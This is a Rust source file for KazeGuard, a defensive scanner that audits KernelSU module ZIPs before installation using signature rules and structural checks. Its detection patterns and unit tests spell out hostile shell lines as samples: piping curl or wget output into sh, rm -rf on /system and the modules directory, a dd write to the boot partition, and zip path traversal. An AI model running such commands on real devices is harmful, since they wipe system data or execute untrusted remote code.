//! KazeGuard: pre-install audit for KernelSU modules.
//!
//! Successor to OriginGuard. Instead of a deep static-analysis pass that tried to
//! reconstruct every path a shell script could touch (and blocked perfectly normal
//! modules for cleaning their own data directory), KazeGuard combines:
//!
//! * a small, remotely updatable catalog of known-bad signatures, and
//! * a handful of precise structural checks for the things that actually brick a
//!   device: destructive deletes of protected roots, raw block-device writes,
//!   piping downloaded code into a shell, and zip path traversal.
//!
//! The catalog is data, so new malware identifiers do not need a new release.
//! Structural checks live in code because they must stay conservative: a false
//! positive here blocks a legitimate install.
//!
//! Policy: `extreme` findings block installation unless the caller passes
//! `--guard-confirmed` (manager dialog) or `--force`. `high` findings are printed
//! prominently but only warn. `medium`/`low` are informational. Scan failures fail
//! open so a scanner bug can never make module installation impossible.

#[cfg(target_os = "android")]
use anyhow::{Context, Result, bail};
use log::warn;
use serde::{Deserialize, Serialize};
#[cfg(target_os = "android")]
use std::collections::BTreeSet;
#[cfg(target_os = "android")]
use std::path::Path;

/// Bundled fallback rules. The remote copy lives at the same path on `main`.
const DEFAULT_CATALOG: &str = include_str!("../assets/guard.json");
#[cfg(target_os = "android")]
const REMOTE_CATALOG_URL: &str =
    "https://raw.githubusercontent.com/KazeSU/KazeSU/main/userspace/ksud/assets/guard.json";
#[cfg(target_os = "android")]
const CATALOG_CACHE_PATH: &str = const_format::concatcp!(crate::defs::WORKING_DIR, "guard.json");

#[cfg(target_os = "android")]
const GUARD_CONFIG_MODULE: &str = "internal.kazeguard";
#[cfg(target_os = "android")]
const GUARD_CONFIG_KEY: &str = "enabled";

#[cfg(target_os = "android")]
const SCHEMA_VERSION: u32 = 1;
/// Cap on bytes read from a single ZIP entry. Pattern matching only needs the
/// head of a file; scripts are far below this, binaries are truncated on purpose.
#[cfg(target_os = "android")]
const MAX_ENTRY_BYTES: u64 = 4 * 1024 * 1024;
#[cfg(target_os = "android")]
const MAX_FINDINGS: usize = 200;
#[cfg(target_os = "android")]
const MAX_EVIDENCE_CHARS: usize = 160;

/// Roots whose recursive deletion or overwrite is never a normal module action.
/// A module's own `/data/adb/modules/<id>` tree is intentionally absent: it must
/// stay free to clean itself (the OriginGuard false positive).
const PROTECTED_PATHS: [&str; 12] = [
    "/data/adb/modules",
    "/data/adb/modules_update",
    "/data/adb/ksu",
    "/data/adb/post-fs-data.d",
    "/data/adb/service.d",
    "/data/system",
    "/metadata",
    "/system",
    "/system_root",
    "/vendor",
    "/product",
    "/data/app",
];

const SCRIPT_EXTENSIONS: [&str; 7] = [".sh", ".ash", ".bash", ".prop", ".lua", ".csh", ".zsh"];

#[derive(Clone, Copy, Debug, Deserialize, Eq, Ord, PartialEq, PartialOrd, Serialize)]
#[serde(rename_all = "lowercase")]
enum Severity {
    Low,
    Medium,
    High,
    Extreme,
}

impl Severity {
    #[cfg(target_os = "android")]
    const fn as_str(self) -> &'static str {
        match self {
            Self::Low => "LOW",
            Self::Medium => "MEDIUM",
            Self::High => "HIGH",
            Self::Extreme => "EXTREME",
        }
    }

    /// Only `extreme` blocks an install that has not been confirmed. `high` is
    /// loud on purpose but stays installable until the manager passes an explicit
    /// confirmation, so this feature cannot break normal installs on its own.
    #[cfg(target_os = "android")]
    const fn blocks_unconfirmed(self) -> bool {
        matches!(self, Self::Extreme)
    }
}

#[derive(Clone, Debug, Deserialize, Serialize)]
struct Rule {
    id: String,
    severity: Severity,
    title: String,
    #[serde(default)]
    reason: String,
    #[serde(default)]
    patterns: Vec<String>,
}

#[derive(Clone, Debug, Deserialize, Serialize)]
struct Catalog {
    #[serde(default = "default_catalog_version")]
    version: u32,
    #[serde(default)]
    updated: String,
    #[serde(default)]
    rules: Vec<Rule>,
}

const fn default_catalog_version() -> u32 {
    1
}

#[cfg(target_os = "android")]
#[derive(Clone, Debug, Serialize)]
struct Finding {
    rule_id: String,
    severity: Severity,
    title: String,
    reason: Option<String>,
    path: String,
    line: Option<usize>,
    evidence: String,
}

#[cfg(target_os = "android")]
#[derive(Clone, Debug, Serialize)]
struct Report {
    schema_version: u32,
    module_id: Option<String>,
    entry_count: usize,
    scanned_files: usize,
    findings: Vec<Finding>,
}

#[cfg(target_os = "android")]
impl Report {
    fn count(&self, severity: Severity) -> usize {
        self.findings
            .iter()
            .filter(|finding| finding.severity == severity)
            .count()
    }

    fn blocks_unconfirmed(&self) -> bool {
        self.findings
            .iter()
            .any(|finding| finding.severity.blocks_unconfirmed())
    }
}

/// Options forwarded from `ksud module install`.
#[derive(Clone, Copy, Debug, Default)]
pub struct GuardOptions {
    /// The user saw the findings and accepted them.
    pub confirmed: bool,
    /// Skip KazeGuard entirely.
    pub skip: bool,
    /// Override everything, including extreme findings.
    pub force: bool,
}

fn parse_catalog(bytes: &[u8]) -> Result<Catalog, serde_json::Error> {
    serde_json::from_slice(bytes)
}

fn bundled_catalog() -> Catalog {
    parse_catalog(DEFAULT_CATALOG.as_bytes()).unwrap_or_else(|error| {
        warn!("KazeGuard: bundled rule catalog is invalid: {error}");
        Catalog {
            version: 0,
            updated: String::new(),
            rules: Vec::new(),
        }
    })
}

#[cfg(target_os = "android")]
fn load_catalog() -> Catalog {
    std::fs::read(CATALOG_CACHE_PATH)
        .ok()
        .and_then(|bytes| parse_catalog(&bytes).ok())
        .unwrap_or_else(bundled_catalog)
}

/// A catalog rule with its patterns already tokenized once per install.
struct CompiledRule {
    id: String,
    severity: Severity,
    title: String,
    reason: String,
    patterns: Vec<Vec<String>>,
}

fn compile_catalog(catalog: &Catalog) -> Vec<CompiledRule> {
    catalog
        .rules
        .iter()
        .map(|rule| CompiledRule {
            id: rule.id.clone(),
            severity: rule.severity,
            title: rule.title.clone(),
            reason: rule.reason.clone(),
            patterns: rule
                .patterns
                .iter()
                .map(|pattern| tokenize(pattern.as_str()))
                .filter(|tokens| !tokens.is_empty())
                .collect(),
        })
        .filter(|rule| !rule.patterns.is_empty())
        .collect()
}

impl CompiledRule {
    fn matches(&self, tokens: &[String]) -> bool {
        self.patterns
            .iter()
            .any(|pattern| contains_sequence(tokens, pattern))
    }
}

/// Lowercase and fold compatibility forms so trivially obfuscated text still
/// matches: fullwidth ASCII (`ｆａｔｅｈ７`), ideographic spaces and zero-width
/// characters are all normalized away.
fn normalize(text: &str) -> String {
    let mut output = String::with_capacity(text.len());
    for character in text.chars() {
        let character = fold_compatibility(character);
        if is_invisible(character) {
            continue;
        }
        for lower in character.to_lowercase() {
            if lower.is_alphanumeric() {
                output.push(lower);
            } else {
                output.push(' ');
            }
        }
    }
    output
}

#[allow(clippy::cast_lossless)]
const fn fold_compatibility(character: char) -> char {
    match character {
        '\u{3000}' => ' ',
        '\u{FF01}'..='\u{FF5E}' => match char::from_u32(character as u32 - 0xFEE0) {
            Some(folded) => folded,
            None => character,
        },
        _ => character,
    }
}

const fn is_invisible(character: char) -> bool {
    matches!(character, '\u{200B}'..='\u{200F}' | '\u{2060}' | '\u{FEFF}')
}

fn tokenize(text: &str) -> Vec<String> {
    normalize(text)
        .split_whitespace()
        .map(str::to_owned)
        .collect()
}

fn contains_sequence(haystack: &[String], needle: &[String]) -> bool {
    if needle.is_empty() || needle.len() > haystack.len() {
        return false;
    }
    haystack
        .windows(needle.len())
        .any(|window| window == needle)
}

/// `rm` against a protected root. Quoted wildcards are allowed because
/// `rm -rf /data/fonts/*` is how modules clean their own data directory; only the
/// resolved base path decides whether this is destructive.
fn deletes_protected_path(line: &str) -> bool {
    let tokens: Vec<&str> = line.split_whitespace().collect();
    let Some(rm_index) = tokens
        .iter()
        .position(|token| *token == "rm" || token.ends_with("/rm"))
    else {
        return false;
    };

    tokens[rm_index + 1..].iter().any(|token| {
        let target = token.trim_matches(|c| c == '\'' || c == '"');
        if target.starts_with('-') || target.contains('$') || target.contains('`') {
            return false;
        }
        let base = target.trim_end_matches('*').trim_end_matches('/');
        is_protected_path(base)
    })
}

fn is_protected_path(path: &str) -> bool {
    PROTECTED_PATHS.iter().any(|root| {
        if path == *root {
            return true;
        }
        // A module is allowed to clean its own tree. Only wiping the whole
        // modules directory (exactly the root, usually via `/*`) is destructive.
        if *root == "/data/adb/modules" || *root == "/data/adb/modules_update" {
            return false;
        }
        path.strip_prefix(*root)
            .is_some_and(|rest| rest.starts_with('/'))
    })
}

fn writes_block_device(lower: &str) -> bool {
    if !lower.contains("/dev/block/") {
        return false;
    }
    lower.contains("of=/dev/block/")
        || lower.contains("of /dev/block/")
        || lower.contains("> /dev/block/")
        || lower.contains(">/dev/block/")
        || lower.contains("flash_erase")
        || lower.contains("mkfs.")
        || lower.contains("sgdisk")
        || lower.contains("parted ")
}

fn pipes_remote_to_shell(lower: &str) -> bool {
    let remote = lower.contains("curl ")
        || lower.contains("wget ")
        || lower.contains("http://")
        || lower.contains("https://");
    if !remote {
        return false;
    }
    let piped = lower.contains("| sh")
        || lower.contains("|sh")
        || lower.contains("| bash")
        || lower.contains("|bash")
        || lower.contains("| ash")
        || lower.contains("|ash")
        || lower.contains("| busybox sh")
        || lower.contains("|busybox sh");
    let evaluated = lower.contains("eval ")
        && (lower.contains("$(curl")
            || lower.contains("$(wget")
            || lower.contains("`curl")
            || lower.contains("`wget"));
    piped || evaluated
}

fn decodes_base64_to_shell(lower: &str) -> bool {
    let decode = lower.contains("base64 -d") || lower.contains("base64 --decode");
    let shell = lower.contains("| sh")
        || lower.contains("|sh")
        || lower.contains("| bash")
        || lower.contains("|bash")
        || lower.contains("| busybox sh")
        || lower.contains("|busybox sh")
        || lower.contains("eval ");
    decode && shell
}

fn installs_package(lower: &str) -> bool {
    lower.contains("pm install") || lower.contains("cmd package install")
}

fn writes_persistence_dir(lower: &str) -> bool {
    let target =
        lower.contains("/data/adb/service.d/") || lower.contains("/data/adb/post-fs-data.d/");
    if !target {
        return false;
    }
    ["cp ", "mv ", "cat ", "install ", "ln ", ">", "echo "]
        .iter()
        .any(|operator| lower.contains(*operator))
}

fn looks_like_script(path: &str, text: &str) -> bool {
    let lower = path.to_ascii_lowercase();
    if SCRIPT_EXTENSIONS
        .iter()
        .any(|extension| lower.ends_with(*extension))
    {
        return true;
    }
    let trimmed = text.trim_start();
    trimmed.starts_with("#!")
}

/// High-confidence structural checks, evaluated per line. The order matters:
/// the first (most severe) match wins so one line cannot produce five findings.
fn classify_line(line: &str) -> Option<(&'static str, Severity, &'static str)> {
    let lower = line.to_ascii_lowercase();

    if writes_block_device(&lower) {
        return Some((
            "KG-FS-003",
            Severity::Extreme,
            "Writes directly to a raw block device",
        ));
    }
    if deletes_protected_path(line) {
        return Some((
            "KG-FS-001",
            Severity::Extreme,
            "Deletes a protected system or KernelSU path",
        ));
    }
    if pipes_remote_to_shell(&lower) {
        return Some((
            "KG-NET-001",
            Severity::High,
            "Executes downloaded code straight from the network",
        ));
    }
    if decodes_base64_to_shell(&lower) {
        return Some(("KG-NET-002", Severity::High, "Executes base64-decoded code"));
    }
    if writes_persistence_dir(&lower) {
        return Some((
            "KG-PERSIST-001",
            Severity::Medium,
            "Writes outside the module directory so it survives uninstall",
        ));
    }
    if installs_package(&lower) {
        return Some((
            "KG-APP-001",
            Severity::Medium,
            "Installs an Android package",
        ));
    }
    if lower.contains("setenforce 0") {
        return Some((
            "KG-SEC-001",
            Severity::Medium,
            "Disables SELinux enforcement",
        ));
    }
    None
}

#[cfg(target_os = "android")]
fn single_line(text: &str) -> String {
    let flat = text.split_whitespace().collect::<Vec<_>>().join(" ");
    if flat.chars().count() <= MAX_EVIDENCE_CHARS {
        return flat;
    }
    let prefix: String = flat.chars().take(MAX_EVIDENCE_CHARS).collect();
    format!("{prefix}...")
}

#[cfg(target_os = "android")]
fn finding(
    rule_id: &str,
    severity: Severity,
    title: &str,
    reason: &str,
    path: &str,
    line: Option<usize>,
    evidence: &str,
) -> Finding {
    Finding {
        rule_id: rule_id.to_owned(),
        severity,
        title: title.to_owned(),
        reason: if reason.is_empty() {
            None
        } else {
            Some(reason.to_owned())
        },
        path: path.to_owned(),
        line,
        evidence: single_line(evidence),
    }
}

#[cfg(target_os = "android")]
fn push_finding(report: &mut Report, seen: &mut BTreeSet<(String, String)>, item: Finding) {
    let key = (item.rule_id.clone(), item.path.clone());
    if seen.insert(key) {
        report.findings.push(item);
    }
}

fn parse_module_id(prop: &str) -> Option<String> {
    prop.lines().find_map(|line| {
        let (key, value) = line.split_once('=')?;
        if key.trim() == "id" {
            Some(value.trim().to_owned())
        } else {
            None
        }
    })
}

fn unsafe_zip_path(name: &str) -> bool {
    name.starts_with('/') || name.contains('\\') || name.split('/').any(|part| part == "..")
}

#[cfg(target_os = "android")]
fn structural_scan(
    path: &str,
    text: &str,
    report: &mut Report,
    seen: &mut BTreeSet<(String, String)>,
) {
    if !looks_like_script(path, text) {
        return;
    }
    for (index, line) in text.lines().enumerate() {
        if report.findings.len() >= MAX_FINDINGS {
            return;
        }
        if let Some((rule_id, severity, title)) = classify_line(line) {
            push_finding(
                report,
                seen,
                finding(rule_id, severity, title, "", path, Some(index + 1), line),
            );
        }
    }
}

#[cfg(target_os = "android")]
fn scan_zip(zip_path: &Path) -> Result<Report> {
    use std::fs::File;
    use std::io::Read as _;

    let catalog = load_catalog();
    let rules = compile_catalog(&catalog);
    let file =
        File::open(zip_path).with_context(|| format!("cannot open {}", zip_path.display()))?;
    let mut archive = zip::ZipArchive::new(file).with_context(|| "not a valid module ZIP")?;
    let mut report = Report {
        schema_version: SCHEMA_VERSION,
        module_id: None,
        entry_count: archive.len(),
        scanned_files: 0,
        findings: Vec::new(),
    };
    let mut seen: BTreeSet<(String, String)> = BTreeSet::new();
    let mut buffer = Vec::new();

    for index in 0..archive.len() {
        let Ok(entry) = archive.by_index(index) else {
            continue;
        };
        if !entry.is_file() {
            continue;
        }
        let name = entry.name().to_owned();
        if unsafe_zip_path(&name) {
            push_finding(
                &mut report,
                &mut seen,
                finding(
                    "KG-ZIP-001",
                    Severity::High,
                    "ZIP entry escapes the module directory",
                    "",
                    &name,
                    None,
                    &name,
                ),
            );
            continue;
        }
        if report.findings.len() >= MAX_FINDINGS {
            break;
        }

        buffer.clear();
        if entry
            .take(MAX_ENTRY_BYTES)
            .read_to_end(&mut buffer)
            .is_err()
        {
            continue;
        }
        report.scanned_files += 1;

        let text = String::from_utf8_lossy(&buffer);
        if report.module_id.is_none() && name.ends_with("module.prop") {
            report.module_id = parse_module_id(&text);
        }
        if text.contains("BIND_ACCESSIBILITY_SERVICE") {
            push_finding(
                &mut report,
                &mut seen,
                finding(
                    "KG-APP-002",
                    Severity::Medium,
                    "Ships an accessibility service payload",
                    "A bundled APK can read the screen and inject input.",
                    &name,
                    None,
                    "BIND_ACCESSIBILITY_SERVICE",
                ),
            );
        }

        let tokens = tokenize(&text);
        for rule in &rules {
            if rule.matches(&tokens) {
                push_finding(
                    &mut report,
                    &mut seen,
                    finding(
                        &rule.id,
                        rule.severity,
                        &rule.title,
                        &rule.reason,
                        &name,
                        None,
                        &rule.title,
                    ),
                );
            }
        }
        structural_scan(&name, &text, &mut report, &mut seen);
    }

    report
        .findings
        .sort_by_key(|finding| std::cmp::Reverse(finding.severity));
    Ok(report)
}

#[cfg(target_os = "android")]
fn print_report(report: &Report) {
    println!();
    println!("KazeGuard pre-install audit");
    println!("===========================");
    if let Some(module_id) = &report.module_id {
        println!("Module: {module_id}");
    }
    println!(
        "Scanned {} of {} files",
        report.scanned_files, report.entry_count
    );
    println!();
    for item in &report.findings {
        let location = item
            .line
            .map_or_else(|| item.path.clone(), |line| format!("{}:{line}", item.path));
        println!(
            "[{}] {} ({})",
            item.severity.as_str(),
            item.title,
            item.rule_id
        );
        println!("  {location}");
        if let Some(reason) = &item.reason {
            println!("  {reason}");
        }
        println!("  {}", item.evidence);
        println!();
    }
    println!(
        "Result: {} extreme, {} high, {} medium, {} low",
        report.count(Severity::Extreme),
        report.count(Severity::High),
        report.count(Severity::Medium),
        report.count(Severity::Low),
    );
}

/// Audit a module ZIP and print the report.
///
/// # Errors
/// Returns an error when the ZIP cannot be read.
#[cfg(target_os = "android")]
pub fn audit(zip: &str, json: bool) -> Result<()> {
    let report = scan_zip(Path::new(zip))?;
    if json {
        println!("{}", serde_json::to_string_pretty(&report)?);
    } else {
        print_report(&report);
    }
    Ok(())
}

/// Run the pre-install gate. Fails open when the audit itself cannot run: a
/// broken scanner must never make module installation impossible.
///
/// # Errors
/// Returns an error only when an unconfirmed extreme finding blocks the install.
#[cfg(target_os = "android")]
pub fn enforce_install(zip: &str, options: GuardOptions) -> Result<()> {
    if options.skip || !is_enabled() {
        return Ok(());
    }
    let report = match scan_zip(Path::new(zip)) {
        Ok(report) => report,
        Err(error) => {
            warn!("KazeGuard: audit failed for {zip}: {error:#}");
            println!("! KazeGuard could not audit this module: {error}");
            return Ok(());
        }
    };

    if report.findings.is_empty() {
        println!("- KazeGuard: no risky patterns found");
        return Ok(());
    }

    print_report(&report);
    if options.force {
        println!("- KazeGuard: --force given, continuing");
        return Ok(());
    }
    if options.confirmed {
        println!("- KazeGuard: findings acknowledged, continuing");
        return Ok(());
    }
    if report.blocks_unconfirmed() {
        bail!("KazeGuard blocked this module. Re-run with --guard-confirmed if you trust it.");
    }
    println!("- KazeGuard: warnings only, continuing");
    Ok(())
}

/// Whether the pre-install audit is enabled. Defaults to on.
#[cfg(target_os = "android")]
#[must_use]
pub fn is_enabled() -> bool {
    match crate::module_config::get_config_value(
        GUARD_CONFIG_MODULE,
        GUARD_CONFIG_KEY,
        crate::module_config::ConfigType::Persist,
    ) {
        Ok(Some(value)) => crate::module_config::parse_bool_config(&value),
        Ok(None) | Err(_) => true,
    }
}

/// Persist the enabled flag.
///
/// # Errors
/// Returns an error when the config store cannot be written.
#[cfg(target_os = "android")]
pub fn set_enabled(enabled: bool) -> Result<()> {
    crate::module_config::set_config_value(
        GUARD_CONFIG_MODULE,
        GUARD_CONFIG_KEY,
        if enabled { "true" } else { "false" },
        crate::module_config::ConfigType::Persist,
    )?;
    println!("{}", if enabled { "Enabled" } else { "Disabled" });
    Ok(())
}

/// Print the current state.
#[cfg(target_os = "android")]
pub fn print_status() {
    println!("{}", if is_enabled() { "Enabled" } else { "Disabled" });
}

#[cfg(target_os = "android")]
fn fetch_remote_catalog() -> Option<Vec<u8>> {
    let script = format!(
        "timeout 20 '{}' wget -q -O - -- '{}'",
        crate::defs::BUSYBOX_PATH,
        REMOTE_CATALOG_URL
    );
    let output = std::process::Command::new(crate::defs::BUSYBOX_PATH)
        .args(["ash", "-c", &script])
        .output()
        .ok()?;
    if output.status.success() {
        Some(output.stdout)
    } else {
        None
    }
}

/// Download and validate the remote catalog, then cache it.
///
/// # Errors
/// Returns an error when the download fails or the response is not a valid catalog.
#[cfg(target_os = "android")]
pub fn update_catalog() -> Result<()> {
    let bytes = fetch_remote_catalog()
        .with_context(|| format!("failed to download {REMOTE_CATALOG_URL}"))?;
    let catalog = parse_catalog(&bytes).with_context(|| "remote rule catalog is invalid")?;
    std::fs::write(CATALOG_CACHE_PATH, &bytes)
        .with_context(|| format!("failed to write {CATALOG_CACHE_PATH}"))?;
    println!(
        "Updated KazeGuard rules to version {} ({} rules, {})",
        catalog.version,
        catalog.rules.len(),
        if catalog.updated.is_empty() {
            "unknown date"
        } else {
            catalog.updated.as_str()
        }
    );
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn rules() -> Vec<CompiledRule> {
        compile_catalog(&bundled_catalog())
    }

    #[test]
    fn bundled_catalog_is_valid() {
        let catalog = parse_catalog(DEFAULT_CATALOG.as_bytes()).expect("bundled catalog parses");
        assert!(!catalog.rules.is_empty());
        assert_eq!(catalog.version, 1);
    }

    #[test]
    fn catalog_patterns_match_obfuscated_text() {
        let tokens = tokenize("payload loads ｚｙｇｉ\u{200B}ｓｋ-floating_overlay menu now");
        assert!(rules().iter().any(|rule| rule.matches(&tokens)));
    }

    #[test]
    fn catalog_patterns_need_the_full_sequence() {
        let tokens = tokenize("zygisk and floating and menu");
        assert!(!rules().iter().any(|rule| rule.matches(&tokens)));
    }

    #[test]
    fn module_cleanup_is_not_blocked() {
        assert!(!deletes_protected_path("rm -rf /data/fonts/*"));
        assert!(!deletes_protected_path("rm -rf \"$persist_dir/logs/*\""));
        assert!(!deletes_protected_path("rm -rf \"$MODPATH/system\""));
        assert!(!deletes_protected_path(
            "rm -rf /data/adb/modules/my_module/system"
        ));
    }

    #[test]
    fn destructive_system_deletes_are_blocked() {
        assert!(deletes_protected_path("rm -rf /data/adb/modules"));
        assert!(deletes_protected_path("rm -rf /system/*"));
        assert!(deletes_protected_path("busybox rm -rf /metadata/"));
        assert!(deletes_protected_path("/system/bin/rm -rf /vendor"));
    }

    #[test]
    fn partition_and_remote_checks_are_precise() {
        assert!(writes_block_device(
            "dd if=/sdcard/boot.img of=/dev/block/by-name/boot"
        ));
        assert!(!writes_block_device(
            "dd if=/dev/block/by-name/boot of=/sdcard/boot.img"
        ));
        assert!(pipes_remote_to_shell(
            "curl -fsSL https://example.invalid/x.sh | sh"
        ));
        assert!(pipes_remote_to_shell(
            "eval \"$(wget -qO- https://x.invalid)\""
        ));
        assert!(!pipes_remote_to_shell("echo pipe to sh later"));
        assert!(decodes_base64_to_shell("base64 -d payload.b64 | sh"));
    }

    #[test]
    fn structural_rules_carry_their_ids() {
        let (id, severity, _) = classify_line("rm -rf /data/adb/modules").expect("finding");
        assert_eq!(id, "KG-FS-001");
        assert_eq!(severity, Severity::Extreme);

        let (id, severity, _) =
            classify_line("pm install /data/local/tmp/app.apk").expect("finding");
        assert_eq!(id, "KG-APP-001");
        assert_eq!(severity, Severity::Medium);
    }

    #[test]
    fn unsafe_zip_paths_are_rejected() {
        assert!(unsafe_zip_path("../../etc/passwd"));
        assert!(unsafe_zip_path("/system/app/Foo.apk"));
        assert!(unsafe_zip_path("system\\app\\Foo.apk"));
        assert!(!unsafe_zip_path("system/app/Foo.apk"));
    }

    #[test]
    fn module_prop_id_is_parsed() {
        let prop = "name=Demo\nid=demo_module\nversion=1\n";
        assert_eq!(parse_module_id(prop).as_deref(), Some("demo_module"));
    }
}
